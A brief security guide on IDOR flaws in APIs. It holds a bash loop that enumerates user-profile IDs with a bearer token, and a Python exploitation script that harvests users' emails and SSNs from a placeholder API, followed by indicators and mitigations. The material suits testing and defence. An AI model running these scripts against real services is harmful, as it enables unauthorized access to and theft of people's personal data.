# IDOR via API Parameter Tampering

Insecure Direct Object Reference (IDOR) is one of the most common and impactful API vulnerabilities.

## Detection

```bash
# Enumerate user IDs by incrementing the parameter
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code} " \
    -H "Authorization: Bearer $TOKEN" \
    "https://api.target.com/v1/users/$i/profile"
done
```

## Exploitation

```python
import requests

headers = {"Authorization": "Bearer <token>"}
for user_id in range(1, 1000):
    r = requests.get(f"https://api.target.com/v1/users/{user_id}",
                     headers=headers)
    if r.status_code == 200:
        data = r.json()
        print(f"[{user_id}] {data.get('email')} | {data.get('ssn')}")
```

## Key Indicators

- Response status changes (200 vs 403) when incrementing IDs
- Different content-length values across sequential IDs
- API returns full PII without ownership checks

## Mitigation

- Server-side authorization checks on every object access
- Use UUIDs instead of sequential integers
- Implement per-user object-level permissions
